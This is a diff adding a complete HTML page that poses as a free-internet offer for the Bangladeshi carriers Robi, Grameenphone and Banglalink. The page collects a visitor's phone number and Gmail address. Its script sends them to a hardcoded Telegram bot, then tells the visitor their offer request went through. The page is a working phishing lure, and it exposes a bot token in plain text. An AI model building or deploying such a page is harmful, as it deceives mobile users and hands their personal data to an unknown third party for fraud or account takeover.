@@ -1,0 +1,102 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>All SIM Offer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #eef2f3;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #d32f2f;
+    }
+    h2 {
+      color: #388e3c;
+      margin-top: -10px;
+    }
+    .logo-container img {
+      width: 80px;
+      margin: 10px;
+    }
+    .form-box {
+      background: #ffffff;
+      padding: 30px;
+      max-width: 400px;
+      margin: 20px auto;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      padding: 12px 25px;
+      background-color: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #1565c0;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>All SIM Offer</h1>
+  <h2>1 GB Free Internet</h2>
+
+  <div class="logo-container">
+    <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Robi_Axiata_Logo.png" alt="Robi">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Grameenphone_logo.svg" alt="Grameenphone">
+    <img src="https://upload.wikimedia.org/wikipedia/en/0/04/Banglalink_logo.png" alt="Banglalink">
+  </div>
+
+  <div class="form-box">
+    <input type="text" id="phone" placeholder="Enter your number" required>
+    <input type="email" id="gmail" placeholder="Enter your Gmail" required>
+    <button onclick="sendToTelegram()">Get Offer</button>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const phone = document.getElementById('phone').value.trim();
+      const gmail = document.getElementById('gmail').value.trim();
+
+      if (!phone || !gmail) {
+        alert('Please fill in both fields.');
+        return;
+      }
+
+      const token = '7832111451:AAFj2hGOmTVhzcjtAgNQOq53SuL7LrA8RV8';
+      const chatId = '6975173404';
+
+      const message = `New SIM Offer Request:\nPhone: ${phone}\nGmail: ${gmail}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            alert('Your offer request has been sent!');
+          } else {
+            alert('Failed to send the request.');
+          }
+        })
+        .catch(error => {
+          alert('Error: ' + error.message);
+        });
+    }
+  </script>
+
+</body>
+</html>
